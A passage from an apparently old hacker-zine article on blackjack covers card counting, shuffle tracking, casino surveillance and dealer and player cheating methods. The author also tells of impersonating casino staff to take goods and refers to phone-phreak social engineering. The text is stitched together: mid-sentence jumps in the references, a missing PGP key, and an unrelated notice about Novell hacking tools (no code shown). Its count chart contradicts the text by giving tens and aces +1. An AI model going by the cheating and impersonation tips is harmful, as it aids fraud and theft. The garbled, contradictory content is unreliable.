the job. We were stuck. Our only recourse was to attempt to win some money to
get us back on track. First we needed a little more capital. Paul, being known
to physically impersonate phone company workers, and a Department of Motor
Vehicles computer technician among others, decided to impersonate a casino
employee so he could "look around". Look around he did, found a storage closet
with a portable cooler and a case of warm soda, not exactly a gold mine but
hey. He proceeded to walk that stuff right out of the casino. We commandeered
some ice and walked around the beach for an hour selling sodas. It wasn't all
that bad as scantily clad women seemed to be the ones buying them. To cut the
story short, Paul knew ESS but he didn't know BlackJack. He lost and we
resorted to calling up Sharp Razor, a fellow Legion member residing in NJ, who
gave us (or is it lent?) the cash to continue our journey. For the record, I
was fairly clueless about BlackJack at the time which really means that I
thought I knew how to play but really didn't because I didn't even know Basic
Strategy. The same goes for Paul. Had we had a chart on hand, we would at least
have made the correct plays.

   Here are the charts, memorize the one that is appropriate:

Card Counting:
--------------

   Card Counting? Don't you have to be some sort of mathematical genius or
have a photographic memory to count cards? No, these are as mythical as that
415-BUG-1111 "trace detector" number posted on all those old hacker BBSes.
Well, you may now say, what if the casino is using 4, 6, or even 8 decks?
Surely you can't keep track of 300+ cards! Don't sweat these details. Probably
the hardest part about learning to play successful BlackJack has already been
accomplished in the previous section. That is: memorizing the appropriate
basic strategy chart. All you really need to count cards is the ability to
count up to plus or minus twelve or so...by ONES! Of course there are more
complicated systems but that is all you need to do for the simplest ones.

   The first card counting systems were developed by our old friend Dr. Thorp.
He determined through mathematical computation that the card that has the most
influence on the deck being in a favorable condition (for the player) was the
five. When the deck is low in fives, the player has a higher advantage than if
it's sparse in any other card. Logic dictated that for a very simple card
counting strategy, simply keep track of the abundance (or lack thereof) of
fives. This is the basis of his "Five Count" system which was later improved
to include tens and renamed the "Ten Count" system.

   Today, there are many different card counting systems. Typically, the more
complex a system is, the better your advantage should you master it. However,
the difference between card counting System X and System Y is usually so small
that ease of using the system becomes more important than gaining an
additional .15 % advantage or whatever it is. I am going to restrict the
discussion to a single card counting system: the high/low (also called the
plus/minus) point count. This strategy is very easy to master. Two other
methods that I recommend if you're serious are the Advanced Plus/Minus and the
"Hi-Opt I" systems. The former being similar to the high/low but assigns
fractional values to certain cards as opposed to integer values which are
easier to add in your head. The latter method is considered one of the most
powerful yet reasonable (with respect to complexity) counting systems of all
time and is detailed extensively on pages 213 to 277 of [7].

   The quick and dirty reason why card counting works is this: The player
gains an advantage when a deck has a SHORTAGE of cards valued 2, 3, 4, 5, 6,
7, 8. When a deck has a SHORTAGE of cards valued 9, 10, Ace; the player has a
DISadvantage. If you can tell when the deck is rich in 9's, 10's, and Aces
(ie, when you hold the advantage) you can do one of the following things:

      1) Bet more money when the deck is favorable to you.
      2) Alter your Basic Strategy play to account for the favorability
         thereby increasing the odds of winning a particular hand.
      3) Combine 1 & 2 by betting more AND altering Basic Strategy.

   Now lets discuss the +/- Point Count. As you can see from the small chart
below, a plus value is given to low cards, and a minus value is given to high
cards. Notice that 7, 8, and 9 have a value of zero. This is because their
overall effect is negligible as compared to the others. Some systems use a
value of -2 for the Ace instead of -1 and give a value of +1 to the seven
instead of zero. If you are using a BlackJack computer game for practice,
check to see what card counting system(s) it uses. They should offer one of
the above two variations. Learn that one, since it will allow you to prepare
well for actual casino play. See the "Some Comments Regarding Computer
BlackJack Programs for the PC" section for more on this. Now the chart:

                   +-----------------------------------------+
                   |    PLUS (+1)      ||     MINUS (-1)     |
                   +-----------------------------------------+
                   | 2 | 3 | 4 | 5 | 6 || 7 | 8 | 9 | 10 | A |
                   +-----------------------------------------+
                   | 1 | 1 | 1 | 1 | 1 || 0 | 0 | 0 | 1  | 1 |
                   +-----------------------------------------+

   As you may notice, this is a balanced system. There are 20 cards in a deck
that are valued +1: two through six. There are 16 ten value cards and 4 Aces
in a deck (20 total) that are valued -1. The remaining 12 cards (7, 8, 9) have
a value of zero. At the end of a deck the count should be zero. A good drill
to practice is to get a deck of cards, turn them over one by one, and keep
track of the count. If you enter a game mid-way between the deck or shoe, flat
bet until the cards are shuffled. Once the cards are shuffled commence
counting from zero.

   Lets do a quick example using ten cards. The following ten cards are shown
in the course of a hand: A, 4, 7, 10, 10, 9, 10, 2, 10, 5. Just so no one gets
lost, we will do one card at a time and then keep the running total: the first
value is -1 (the Ace) & the second is +1 (the 4) = 0 (the current total hand
count). The next card is the 7 which is zero so disregard it. The next card is
a ten so the total count is now -1. The next card is another ten, giving a
total count of -2. The next card is a nine which has a value of zero so ignore
it, total count is still at -2. Next is a ten, total count is at -3. Next is
a two which adds +1 to the minus three yielding a total of -2. A quick look at
the next two cards shows that the two will cancel each other out (-1+1=0). So
at the end of a hand of ten cards dealt to 2 players and the dealer, the point
count is minus two. This provides you with the knowledge that your are at a
slight disadvantage. Your next bet should either be the same or a unit or two
lower.

   From this example you see that it would be easier to count cards if you
play in a "cards-up" game. That way you can see all the cards as they are
dealt and count them as they go by. When the dealer deals fast, just count
every two cards. You still count each card but you only add to your total
count after every two cards since many times the two values will cancel each
other out to give a net value of zero, which doesn't need to be added to your
total. If you play in a cards-down game, you may want to consider playing at
third base. The reason being is that in a cards-down game you only see the
other players' cards:

 a) if you peek at their hand (not polite but it's not cheating like in poker)
 b) if a player busts
 c) when the dealer settles each players' hand.

   When there are other people at a table, all this happens rather quickly and
you may miss a few cards here and there which essentially invalidates your
count. You can't control how fast the dealer deals, but you can slow things
down when the dealer prompts you for a play decision.

   I am not going to discuss changing basic strategy here. The chart you
memorize in Basic Strategy section of this file will be fine for now. If you
are already adept at the plus/minus count then find a book that has a complete
system including the appropriate changes to Basic Strategy that reflect the
current running and/or true count.

   For one deck, alter your wager according to the following table:

                        BET UNITS   +/- Running Count
                        -----------------------------
                            1            +1 or less
                            2            +2 or +3
                            3            +4 or +5
                            4            +6 or +7
                            5            +8 or more

   Example: After the first hand of a one deck game, the point count is plus
four and you just bet a $5.00 chip. Before the next hand is dealt, wager
$15.00 (three units of $5.00) as the above table mandates.

   What if there are four, six, or more decks instead of just one? I recommend
that you perform a "true-count" rather than trying to remember different
betting strategies for different number of deck games. By doing a true count,
the above table can still be used.

   The True Count is found by the ensuing equation. I provide an example along
with it for the case of having a running count of +9 with one and a half decks
left unplayed. It doesn't matter how many decks are used, you just have to have
a good eye at guesstimating the number of decks that are left in the shoe. I
just measured the thickness of a deck of cards to be 5/8 (10/16) of an inch.
Hence the thickness of a half deck is 5/16 of an inch. One and a half decks
would be 10/16 + 10/16 + 5/16 = 25/16 or a little over an inch and a half. You
probably see a relationship here. The number of decks is approximately equal
to the height of the cards in inches. Easy.

                             Running Count           +9
            True Count = ----------------------  =  ----- = +6
                          # of Decks Remaining       1.5

   Looking at the table of betting units above, the proper wager would be four
units.

   If you have trouble keeping the count straight in your head, you can use
your chips as a memory storage device. After every hand tally up the net count
and update the running or true count by rearranging your chips. This is
somewhat conspicuous however, and if done blatantly, may get you labeled a
counter.

   If for some reason you despise the notion of counting cards, you may want
to pick up Reference [11], "Winning Without Counting". The author writes about
using kinesics (body language) to help determine what the dealers' hole card
is after checking for a Natural. He claims that certain dealers have certain
habits as far as body language is concerned, especially when they check to see
if they have a BlackJack. The dealer will check the hole card if he/she has a
ten value card or an Ace as the up-card. When the hand is over you will see
what the hole card really was. You may be able to discern a certain
characteristic about the dealer, such as a raising of the eyebrows whenever
the hole card is a 2-9 or perhaps a slight frown, etc. There is some
usefulness to this method but I wouldn't rely on it very much at all. I have
only used it for one particular situation. That being when the dealer has a
ten up card and checks to see if the hole card is an Ace. Note that many
dealers check the hole card very quickly and turn up just the corner of the
card so as to prevent any of the players from seeing the card. If the hole
card is an Ace, the dealer will turn over the card and declare a BlackJack.
However, if the hole card is a 4, many times the dealer will double check it.
The reason for this double take is simply that a 4 looks like an Ace from the
corner, get a deck of cards and see for yourself. A 4 really looks like an Ace
and vice-versa when the corner is checked in a QUICK motion. So, if you see
the dealer double check the hole card and NOT declare a BlackJack, you can be
fairly sure the hold card is a four, giving the dealer a total of 14. You can
now adjust your basic strategy play accordingly. This situation has only come
up a few times in my case, but once was when I had a $50.00 bet riding on the
hand and I won the hand by using that additional information. Dr. Julian Braun
has previously calculated that the player has about a 10% advantage over the
house should he/she know what the dealer's hole card is. This is quite
substantial. Of course you have to memorize a specific Basic Strategy chart
for the case of knowing what the dealers' total is in order to obtain the
maximum benefit. I haven't bothered memorizing this chart simply because it is
a rare occurrence to know what the dealers' hole card is. If you sit down at a
table with an inexperienced dealer, you might catch a couple more than usual,
but I don't think it is enough to warrant the extra work unless you want to
turn pro.

   Another thing Winning Without Counting mentions is to pay attention to the
arches and warps in the cards. Perhaps a lot of the ten value cards have a
particular warp in them due to all those times the dealer checked for a
BlackJack. The author claims that he has used this to his advantage. Maybe so,
but I don't put much stock in this technique. I have enough things to worry
about while playing.

   One last thing. There is no law or rule that says a dealer cannot count
cards. A dealer may count cards because he or she is bored but more likely is
that the casino may encourage counting. The reason being that if the deck is
favorable to the player, the house can know this and "shuffle up". This is
also called preferential shuffling (a game control measure) and it vaporizes
your advantage.


Shuffle Tracking:
-----------------

  Shuffle What? Shuffle Tracking. This is a fairly new (15 years +/-)
technique that has not been publicized very much. One problem with many of the
BlackJack books out there is that they are not hip to the current game. The
obvious reason for this is that many are old or simply re-formulate strategies
that were invented decades ago. It's just like reading "How to Hack the Primos
Version 18 Operating System" today. The file may be interesting, many of the
commands may be the same, but it doesn't detail how to take advantage of, and
subvert the CURRENT version of the OS.

   The best definition I have seen is this one quoted from Reference [5]:
"'Shuffle-tracking' is the science of following specific cards through the
shuffling process for the purpose of either keeping them in play or cutting
them out of play." The concept of Shuffle tracking appears to have resulted
from bored mathematician's research and computer simulation of shuffling
cards, a familiar theme to BlackJack you say. The main thing that I hope every
reader gets from this section is that just because someone shuffles a deck (or
decks) of cards does not in any way mean that the cards are "randomized". The
methods mentioned in the two previous sections (Basic Strategy and Card
Counting) ASSUME A RANDOM DISTRIBUTION OF CARDS! That is an important point.
According to some authors, a single deck of cards must be shuffled twenty to
thirty times to ensure a truly random dispersion. If a Casino is using a 6
deck shoe, that's 120 to 180 shuffles! Obviously they aren't going to shuffle
anywhere near that many times. But don't despair, there are some types of
shuffles which are good, and some that are bad. In fact, if the cards were
always randomly disbursed, then you would not be reading this section due to
it's lack of relevance. As in the Card Counting section, I am going to
restrict the discussion to the basics of shuffle tracking as the combination
of references listed at the end of this section provide a complete discourse of
the topic.

   A beneficial (to the player) shuffle for a one deck game is executed by
dividing the deck equally into 26 cards and shuffling them together a minimum
of three times. This allows the cards to be sufficiently intermixed to yield a
fairly random distribution. An adverse shuffle prevents the cards from mixing
completely.

   The simplest example is the Unbalanced Shuffle. As its name implies, the
dealer breaks the deck into two unequal stacks. As an example, lets say you
are playing two hands head on with the dealer and the last 10 cards in the
deck are dealt. The result of the hand was that both your hands lost to the
dealer primarily due to the high percentage of low value cards in the clump.
Note that if you were counting, you would have bet a single unit since the
deck was unfavorable. The dealer is now ready to shuffle the deck, and
separates the deck into 31 cards in one stack and 21 in the other stack. The
dealer shuffles the two stacks. If the shuffle is done from the bottom of each
stack on up, the top ten cards of the larger stack will remain intact without
mixing with any of the other cards. Those ten cards can remain in the order
they were just dealt throughout the shuffle if the process of bottom to top
shuffling is not altered. You are now asked to cut the deck. If you don't cut
the deck, the 10 cards that were dealt last hand will be dealt as your first
two hands. The result will be the same as your last and you will lose the two
hands. However, if you cut the deck exactly at the end of those ten cards, you
have just altered the future to your benefit. Those cards will now be placed at
the bottom of the deck. Should the dealer shuffle up early, you will avoid them
altogether. In addition, if you were keeping count, you would know that the
deck was favorable during the first 3-4 hands since there would be an abundance
of tens in the portion of the deck that will be played. You would accordingly
increase you bet size to maximize your winnings.

   Some dealers will unknowingly split the deck into unequal stacks. However,
more often than not, they are REQUIRED to split the deck into unequal stacks.
If they are required to do this, they are performing the House Shuffle. The
casino has trained the dealer to shuffle a particular way...on purpose! Why?
Because in the long run, the house will benefit from this because most players
will not cut any bad clumps out of play. If you have played BlackJack in a
casino, how much did you pay attention to the way they shuffled? Like most
people you were probably oblivious to it, perhaps you figured that during the
shuffle would be a good time to ask that hot waitress for another drink.
Regardless, you now see that it may be a good idea to pay attention during the
shuffle instead of that set of "big breastseses" as David Allen Grier says on
the "In Living Color" TV show ;)-8-<

   There are a number of shuffle methods, some of which have been labeled as:
the "Zone Shuffle", the "Strip Shuffle", and the "Stutter Shuffle". The Zone
Shuffle is particular to shoe games (multiple deck games) and is probably one
of the most common shuffle methods which is why I mention it here. It is
accomplished by splitting the shoe into 4 to 8 piles depending on the number
of decks in the shoe. Prescribed picks from each pile are made in a very exact
way with intermittent shuffles of each pair of half deck sized stacks. The net
effect is a simple regrouping of the cards pretty much in the same region of
the shoe as they were before, thereby preventing clumps of cards from being
randomly mixed. If the dealer won 40 hands and you won 20, this trend is
likely to continue until you are broke or until the unfavorable bias is
removed through many shuffles.

   What if the players are winning the 40 hands and the dealer only 20? If the
dealer has been mentally keeping track of how many hands each side has won in
the shoe, the dealer will probably do one of two things. One is to keep the
shuffle the same, but 'strip' the deck. When a dealer strips a deck, he/she
strips off one card at a time from the shoe letting them fall on top of one
another onto the table. This action causes the order of the cards to be
reversed. The main consequence is to dissipate any clumping advantages (a bunch
of tens in a clump) that the players may have. The second thing the dealer may
do is simply change the way they shuffle to help randomize the cards.

   I personally believe that casinos use certain shuffles on purpose for the
sole reason that they gain some sort of advantage. A BlackJack dealer friend
of mine disputes the whole theory of card clumping and shuffle tracking
though. The mathematics and simulation prove the non-random nature of certain
shuffles under controlled conditions. Perhaps in an actual casino environment
the effect isn't as high. Regardless, next time you are playing in a casino
and its time to shuffle a shoe, ask the dealer to CHANGE they WAY he/she
shuffles. The answer will nearly always be NO. Try to appeal to the pit boss
and he/she will probably mumble something about casino policy. Why are they
afraid to change the shuffle?

Casino Security and Surveillance:
--------------------------------

   I figured this section might get some people's attention. It is important
to know what the casino is capable of as far as detecting cheating (by
employees and customers) and spotting card counters.

EYE IN THE SKY: A two way mirror in the ceiling of the casino. It's not hard
to spot in older casinos as it usually is very long. Before 1973 or so,
employees traversed catwalks in the ceiling and it was easy for dealers and
players to hear when they were being watched. Sometimes dust from the ceiling
would settle down onto a table when someone was above it. Newer casinos use
those big dark plexiglass bubbles with video camera's which should be watched
constantly. These cameras have awesome Z00M capabilities and according to
Reference [9], the cameras can read the word "liberty" on a penny placed on a
BlackJack table. I am sure the resolution is better than that for the latest
equipment. The video images are also taped for use as evidence should anything
that is suspect be detected. Just like computer security audit logs, if no one
pays attention to them, they don't do much good. If you want a job monitoring
gamblers and casino employees, you need to train for about 500 hours (about
twenty 40 hour weeks) to learn all the tricks people try to pull on you.
Pretty intensive program wouldn't you say?

CASINO EMPLOYEES: Then there are the casino employees. The dealers watch the
players, the floor men watch the dealers and the players, the pitbosses watch
the dealers, the floormen, and the players, etc. There may be plain clothes
detectives roaming about. In a casino, everyone is suspect.

BLACK BOOK: A company that you will see mentioned in a lot of casino books is
Griffin Investigations. They periodically update a book that casino's
subscribe to that have pictures and related info on barred card counters and
known casino cheats.....I suppose the "black book" as it is called, is
analogous to the "Bell security hit-lists", that had (have?) files on known
phreaks and hackers.


Social Engineering the Casino:
------------------------------

   If you are good at getting an ESS operator to enter NET-LINE on DN COE-XXXX,
and at getting those "Engineering Resistant Hard Asses up at SNET (Southern
New England Telephone)" [as The Marauder affectionately calls them] to give
you the new CRSAB number; then this section will be a piece of cake for you
to master.

   References [3], [7], and [8] have many stories regarding playing in
casinos, getting barred, and various exploits. I am not going to repeat any of
them here. In each of those books, the authors talk about their first
experiences getting barred. In each case they were fairly bewildered as to why
they were kicked out, at least until some casino employee or owner told them
things like "you're just too good" and the ever diplomatic: "we know your
kind, get the hell out!".

   As you probably have gathered thus far, card counters are as undesirable in
a casino as a phone phreak is in a central office. There are a number of
behavioral characteristics which have been attributed to the 'typical' card
counter. Probably the most obvious act of a counter is a large increase in bet
size. If you recall in the Card Counting section, when the deck is favorable,
you bet more. When the deck is unfavorable, you bet less. Dr. Thorp's original
system required a variation in bet size from one to ten units. When the deck
is favorable the system may dictate that you go from a ten dollar bet to a
hundred dollar bet. Kind of gets the attention of the dealer and the pit boss.
However, this type of wild wagering is typical of big money hunch bettors.
Hunch betters will just plop down a bunch of chips at random due to 'hunches'.
Therefore, a large increase in bet size won't necessarily cause you to be
pegged as a counter.

   Intense concentration, never taking your eyes off the cards, lack of
emotion...ie, playing like a computer, is pretty much a give away that you are
counting. Other things such as 'acting suspicious', meticulously stacking your
chips, betting in discernable patterns, and a devout abstention from alcohol
may also attract unwanted attention.

   Another criteria used for spotting counters is if there are two or more
people playing in concert with one another. Ken Uston is famous for his
BlackJack teams. They have literally won millions of dollars collectively.
When the "Team-LOD" gets together to play, we have to pretend we don't know
each other so as not to attract undue attention ;-)

   What I mean by Social Engineering the casino is to list ways that trick the
casino into thinking you are just a dumb tourist who is throwing money away.
Look around, smile, act unconcerned about your bet, don't be afraid to talk to
the dealer, floorperson, or pit boss. Don't play 8 hours straight. Perhaps
order a drink. Things of this nature will help deflect suspicion.

   I only recall attracting attention once. The casino wasn't very busy, there
were 3 people at the table including myself. I only had about an hour to play
so I bet aggressively. I started with $5 and $10 but made some $50.00 bets
whenever I got a feeling that I was going to win the next hand (quite the
scientific strategy I know). A woman next to me who seemed to be a fairly
seasoned player made a comment that I was a little too aggressive. The pit boss
hovered about the table. My hour was nearly up, I bet $10.00 for the dealer and
$50.00 for myself. I lost the hand leaving me only $100.00 ahead, and left. The
only thing I could think of besides the betting spread which really wasn't a
big deal was that the casino was FREEZING inside. I was shivering like hell,
it probably looked like I was shaking out of fear of being spotted as a
counter or worse...a cheater.

   So what if a casino thinks you are counter? To be honest, there have
probably been less than 1000 people who have been permanently barred from play
(ie, they have their mugs in the black book). A far greater number have been
asked to leave but were not prevented from returning in the future.

   Tipping the dealer may not necessarily get the casino off your back but
certainly doesn't hurt. When you toke the dealer, place the chip in the corner
of your betting box a few inches from your bet. You may want to say "we are in
this one together" or some such to make sure they are aware of the tip. This
approach is better than just giving them the chip because their 'fate' is tied
in with yours. If your hand wins, 99 out of 100 times they will take the tip
and the tip's winnings off the table.

   The 1 out of 100 that the dealer let the tip+win ride happened to me over
and over again for the better part of a day. It was a week before I had to go
back to college and I was broke, with no money to pay the deposits for rent
and utilities. Basically, if I didn't come up with some money in 7 days, I was
not going back to school. This was 4 years ago BTW. I took out $150 on my
credit card (stupid but hey, I was desperate) and started playing and winning
immediately. I pressed my bets time and time again and in an hour or two had
$500 in front of me (+$350). I started losing a bit so I took a break for a
short while. I went back to a different table with a different dealer. As soon
as I sat down I started winning. I started to tip red chips ($5.00) for the
dealer. The first couple of times he took the $10.00 right away. I kept
winning steadily and continued to toke him. Then he started to let the $10.00
ride! I was amazed because I had never seen that before. That is when I knew I
was HOT. If the dealer is betting on you to win, that says something. When I
stopped playing I cashed in eight black chips. I left with eight one hundred
dollar bills, a net profit of $650.00, just enough to cover everything. Whew!
I probably tipped close to $100.00 that day, and the dealer must have made
double to triple that due to him betting with me. There were a number of times
when the pit boss wasn't close that the dealer would IGNORE my hit or stand
signal. The first time he did this I repeated myself and he did what I asked
but gave me a 'look'. Needless to say, I lost the hand. After that, if he
'thought' I said stand, I didn't argue. This occurred when he had a ten as the
up-card so he knew his total from peeking at the hole card. I am not sure if
this is considered cheating because I did not ask him to do this, nor did we
conspire. It just happened a few times, usually when I had $25-$50 bets on the
line which is when I made sure to throw in a red chip for him.


Casino Cheating and Player Cheating:
------------------------------------

   Cheating by the house is rare in the major casinos ie, those located in
Nevada and Atlantic City. The Nevada Gaming Commission may revoke a casino's
gambling license if a casino is caught cheating players. Granted, there may be
a few employees (dealers, boxmen, whomever) that may cheat players, but it is
extremely doubtful any casino in Nevada or Atlantic City does so on a
casino-wide scale. You definitely should be wary of any casino that is not
regulated such as those found on many cruise ships. Because a casino does not
have to answer to any regulatory agency does not mean it is cheating players.
The fact is that casino's make plenty of money legitimately with the built-in
house advantages and don't really need to cheat players to survive. I provide
some cheating methods here merely to make you aware of the scams. These
techniques are still carried out in crooked underground casinos and private
games.

   The single deck hand-held BlackJack game is quite a bit more susceptible to
cheating by both the dealer and the player than games dealt from a shoe. The
preferred method of dealer cheating is called the "second deal". As you may
infer, this technique requires the card mechanic to pretend to deal the top
card but instead deals the card that is immediately under the top card.
Imagine if you could draw a low card when you need a low card, and a high card
when you need a high card. You could win large sums of money in a very short
period. Well, a dealer who has the ability to execute the demanding sleight of
hand movements for second dealing can drain even the best BlackJack player's
bankroll in short order.

   If someone is going to deal seconds, they must know what the second card is
if he or she is to benefit. One way to determine the second card is by
peeking. A mechanic will distract you by pointing or gesticulating with the
hand that is holding the deck. "Look! There's Gail Thackeray!". While you are
busy looking, the dealer is covertly peeking at the second card. A more risky
method is pegging. A device called a pegger is used to put small indentations
in the cards that the dealer can feel. Pegging all the ten value cards has
obvious benefits.

   Another method is the "high-low pickup". I like this one because it's easy
for a novice to do especially in a place where there are a lot of distractions
for the players. After every hand, the dealer picks up the cards in a high-low
alternating order. The mechanic then proceeds with the "false shuffle" in
which the deck is thought to have been shuffled but in reality the cards
remain in the same order as before the shuffle. As you well know by now, a
high-low-high-low arrangement of the cards would be death to the BlackJack
player. Get dealt a ten and then a 5, you have to hit, so get another ten.
Busted. Since the dealer doesn't lose until he/she busts, all the players who
bust before lose. Bottom dealing and switching hole cards are other techniques
that may be used to cheat players.

   For shoe games, there is a device called a "holdout shoe" that essentially
second deals for the dealer. Discreet mirrors and prisms may be contained in
the holdout shoe which only allow the dealer to see what card is next.
Shorting a regular shoe of ten cards will obviously have a detrimental effect
on the BlackJack player.

   Player cheating isn't recommended. However, I'll quickly list some of the
methods for awareness purposes. The old stand-by of going up to a table,
grabbing some chips, and running like hell is still done but certainly lacks
originality. Marking cards while you play is another popular method. "The
Daub" technique is done by clandestinely applying a substance that leaves an
almost invisible smudge on the card. High value cards like tens are usually
the targets. One scam mentioned in one of the references was the use of a
special paint that was only visible to specially made contact lenses. The
"hold out" method requires the palming of a card and substituting a better
one. This is usually done when there is big money bet on the hand. One of the
risks to these methods is when the deck is changed since the pit boss always
scrutinizes the decks after they are taken out of play.

   Other methods entail playing two hands and switching cards from one hand to
the other, counterfeiting cards and/or casino chips, adding chips after a
winning hand (I have seen this done twice, couldn't believe my eyes but
certainly wasn't going to RAT the thieves out). Some dealers may be careless
when looking at their hole card for a BlackJack. A person behind the dealer on
the other side of the pit may be able to discern the card. The value is then
signalled to a player at the table. Astute pit bosses may notice someone who
is not playing that scratches their head too much though. Wireless signalling
devices have been used for various purposes but some casinos have new
electronic detection systems that monitor certain frequencies for activity.


Some Comments Regarding Computer BlackJack Software for PC's:
---------------------------------------------------------------

   I strongly recommend that you practice using a BlackJack program of some
kind before going out to play with real cash. The first program I used for
'training' some years ago was "Ken Uston's BlackJack" on my old Apple ][+.
Later I acquired "Beat The House" for the same machine. I recently bought a
program for my IBM and have been using it to refresh my memory regarding basic
strategy, card counting, and money management techniques. I assume you will
recognize the guy's name in the title now that you have read most of this
article. I bought: "Dr. Thorp's Mini BlackJack" by Villa Crespo Software at a
Wal-Mart of all places for a measly $7.88. This is an abridged version
however. Villa Crespo charges $12.95 for it if you order via mail. They also
offer an unabridged version for $29.95 via mail. Villa Crespo (don't ask me
where they got that name) offers other programs for Craps, Video Poker, and
7-Card Stud in case you are interested in those games of chance. By the way,
on the order form I also noticed "FAILSAFE Computer Guardian (Complete
protection and security for your system)" for $59.95. For some reason any time
a piece of paper has the word 'security' on it, my eyes zero in on it....

   Some features that I liked about this scaled down version of their
BlackJack program were the TUTOR, which advises you on whether to hit, stand,
take insurance (no way), etc. as per Basic Strategy. The Tutor for the
abridged version does NOT take into consideration the card count when making
recommendations though. If you are counting the cards, the program keeps count
also, so if you lose count you can check it by pressing a function key. The
STATS option is neat since it keeps track of things such as how many hands
were dealt, how many you won/lost, etc. and can be printed out so you can
track your progress. The program allows you to save your current session in
case you get the urge to dial up the Internet to check your email, something
that should be done every hour on the hour....

   One thing I did not like about the program was that it allowed you to bet
over your bankroll. I accidentally pushed [F2] (standardized at $500.00 a
bet instead of [F1] (standardized at $5.00 a bet) ---- a slight difference in
wager I'd say. Having only $272.00 in my bankroll didn't stop the program from
executing the command and in my opinion it should have prevented the overdraft.

   The first time I played Dr. Thorp's Mini BlackJack, it took me about 95
hands to double my money. I started with $200.00, bet from $5.00 to $25.00,
never dropped below $180.00 which surprised me, and received 3 BlackJacks. I
won 63 hands, and lost 32. I played head on against the dealer, although the
program allows for up to 6 players. I consider that lucky since I had my fair
share of going broke in later sessions.

   My advice when using a BlackJack computer program is: do not start with a
bizzillion dollars or anything like that. Start with the amount that you truly
plan to use when you sit down at an actual table. If you play in a crowded
casino, all the low minimum bet tables (ie: $1.00 to $5.00) will most likely be
filled to capacity and only $10.00 or $15.00 tables will have openings. Keep
this in mind because when you make bets with the computer program, you should
wager no less than whatever the minimum will be at the table you sit down at.
If your bankroll is only $200.00 playing at anything more than a $5.00 minimum
table is pushing it.

   Another thing to note is that playing at home is kind of like watching
Jeopardy on TV while you are sitting on the couch. People who have been on the
show always say it was much harder than when they blurted out answers during
dinner with their mouths full (the Heimlich maneuver--a real lifesaver!). The
same thing goes for BlackJack. When you are sitting at an actual table, your
adrenaline is flowing, your heart starts to pump faster, you make irrational
plays especially when you start losing, and odds are you will forget things
that were memorized perfectly. There is no substitute for the real thing and
real experience.


Quick Comments on Other Casino Games:
-------------------------------------

   A few people suggested I briefly mention some of the other casino games so
I added this section. I don't go into much detail at all as this file is too
unwieldy already. Besides, if you want to know more, I am sure you'll pick up
the appropriate reference. Hundreds of books have been published on gambling
and they are available by contacting [2]. My aim here was to mention details
that most people may not be aware of.

BACCARAT: This is the game you see in movies a lot. See [12]'s FAQ for a good
explanation of this game.

CRAPS: Craps is probably the most complicated casino game as far as the
different ways to bet things are concerned but its really not that hard to
learn. I just want to throw one table at you adapted from Reference [13]. The
table won't make much sense unless you are already familiar with craps. In
case you have forgotten or didn't know, craps is 'that dice game'. The purpose
of presenting it is to save you $$$$$ <-- Still love that dollar sign key! hehe

                         Lamest Bets at the Craps Table

                BET            PAYS     SHOULD PAY   YOUR ADVANTAGE
              -------------------------------------------------------
              Any-7            4  to 1     5 to 1         -16.7 %
              2 (or 12)        30 to 1    35 to 1         -13.9 %
              Hard 10 (or 4)   7  to 1     8 to 1         -11.1 %
              3 (or 11)        15 to 1    17 to 1         -11.1 %
              Any Craps        37 to 1     8 to 1         -11.1 %
              Hard 6 (or 8)    9  to 1    10 to 1         -9.1  %

SLOTS: Playing slots is a gamble. Obviously you say. No, I mean its a gamble
to play them. House advantages are almost never displayed on a particular slot
machine. Different machines and different locations may have different casino
win percentages. When you go up to a slot machine, you have no idea if its'
advantage over you is 5% or 25%. Unless you have been watching it, you don't
know if it just paid off a big jackpot either. I don't play slots as a matter
of principle. If you do play I think there are still some $.05 slots in Vegas.
Play the nickel slots and keep your shirt, especially if its an LOD T-shirt.

VIDEO POKER: Reference [13] gives the following advice regarding video poker:
"...don't expect to win. Manage your money so that you limit your losses." I
think its a bit negative but I can't argue with the logic. Also, as with
slots, you may want to play at a machine that is networked with others which
has a progressive payoff. This way at least you have a chance of making the
big bucks in addition to those periodic small payoffs.

VIDEO BLACKJACK: If you like to avoid people and like BlackJack, you may be
thinking that this is a great way for you to "hack two systems with one
password" and make a little money on the side. Before you start putting
quarter or dollar tokens into video BlackJack machines there are a couple of
things to know. First, you can't use card counting techniques because
every hand is essentially dealt from a new deck. When the computer deals a
hand it is just providing 'random' cards. Perhaps if you saw the source code,
you may be able to determine some sort of bias but I suspect it would be
minuscule at best. The rules vary from machine to machine and the maximum
allowable bet varies also. As with the video poker and video slot machines,
the owner of the machine may set the options to their taste (amount of profit).

barred from playing BlackJack (a casino employee told him he could play any
game in the casino EXCEPT BlackJack) after he was ahead only $40.00. The
reason apparently was due to his fairly mechanical play and betting. The

pub/rec.gambling/blackjack directory. This is a very detailed 78K file that
was well done. It provides plenty of the nitty-gritty details that I did not
have the space to mention in this article. I highly recommend it.

[16] "Risk of Ruin" by Michael R. Hall available from same source as [15]
above. This paper provides some mathematical formulas for helping you
determine the likelihood of losing portions of your starting bankroll.
Although the equations look complicated, anyone with a $10. scientific
calculator can use them. The author provides source code for a program written
in C that calculates the risk formula. Also get his "Optimal Wagering" file
which helps you determine your bet size.

[17] The movie: "Fever Pitch" starring Ryan 'O Niel. This is the most realistic
movie I have seen regarding the psychology of a gambler. If I recall correctly,
it was made in 1985 and is in most video rental stores.


Final Comments:
---------------

   Let me quickly thank those who took the hour to read my article, recommended
corrections and offered their insightful comments: The Marauder, Mark Tabas,
Professor Falken, Al Capone, Jester Sluggo, and Bruce Sterling. Also, I would
like to thank JLE, my 'gambling mentor' mentioned earlier even though he
doesn't know me as 'lex' and probably will never see this file.

   If anyone has comments, corrections, etc. feel free to email me. Kindly
note that I have no interest in receiving flames from any self professed
BlackJack experts out there as I do not claim to be an expert and due to size
restrictions, I couldn't get all that complicated regarding counting
techniques and such. Besides, anyone who wants to get serious will take the
time to thoroughly read the references listed in the previous section. My main
purpose was to familiarize you with the game of BlackJack and provide a
resource which can point you in the right direction for more in-depth
information. Thank you for your time and I hope you learned something from
this article even if you don't put any of the information to use.

   If you have something really SEKRET to tell me, here is my PGP Public Key:

In nearly a year since their release, the programs Hack.exe and View.exe
are still potential threats to the security of Novell Networks.  Despite
Novell's commendable response with a patch for the holes these programs
exposed, many system administrators have not yet implemented the fix.

We at Phrack encourage system administrators to uudecode and execute the
following programs to determine whether or not their servers are at
risk.

The patches, SECUREFX.NLM for Netware 3.11, and SECUREFX.VAP for Netware
2.2 are available via Novell's NetWire, or from ftp.novell.com.  Users
with additional questions about Netware security can call Novell
directly at 800-638-9273.

